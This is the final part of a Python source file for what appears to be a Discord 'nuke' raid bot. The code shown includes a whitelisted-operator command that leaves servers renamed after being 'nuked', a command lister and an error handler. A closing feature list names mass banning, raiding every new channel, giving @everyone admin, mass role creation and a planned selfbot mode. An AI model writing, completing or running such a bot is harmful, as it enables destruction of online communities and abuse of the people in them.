        print_colored("Bot doesn't have permission to manage channels.")
    except Exception as e:
        print_colored(f"An error occurred while purging the channel: {e}")
@bot.command()
async def cleanup(ctx):
    """Leaves Nuked Servers."""
    if str(ctx.author.id) not in whitelisted_ids:
        print_colored(f"Non-whitelisted command attempt by {ctx.author.id}: {ctx.message.content}")
        return

    target_name = "𝖒𝖔𝖗'𝖘 𝖕𝖗𝖔𝖕𝖊𝖗𝖙𝖞"
    left_count = 0

    for guild in bot.guilds:
        if guild.name == target_name:
            await guild.leave()
            left_count += 1

    await ctx.send(f"Left {left_count} servers named '{target_name}'.")
@bot.command()
async def cmds(ctx):
    """Displays all available bot commands."""
    if str(ctx.author.id) not in whitelisted_ids:
        print_colored(f"non-whitelisted cmd attempt {ctx.message.content}")
        return
    command_list = []
    for command in bot.commands:
        command_list.append(f"{command.name} - {command.help}")
    commands_formatted = "\n".join(command_list)
    response = f"```\n{commands_formatted}\n```"
    await ctx.send(response)
@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        print_colored(f"Commandnotfound error.")
    elif isinstance(error, commands.MissingPermissions):
        print_colored(f"Missingperms error.")
    elif isinstance(error, commands.BotMissingPermissions):
        print_colored(f"Botmissingperms error.")
    else:
        print_colored(f"unknown error. {error}")
        
try:
    bot.run(token)
except Exception as e:
    print(f"An error occurred during bot login: {e}")
    traceback.print_exc()
# FEATURE TODO LIST (beta)✅
# offline status 👍
# commands 👍
# fix automatically raiding any channel thats made 👍
# banall 👍
# give @everyone admin command 👍
# mass role creation command 👍
# leaderboard 👍
# permchecker 👍
# ascii and cool design 👍
# whitelisted ids 👍

# FEATURE TODO LIST (main)
# selfbot option ❌
# website with the commands
# nuke stopper 👍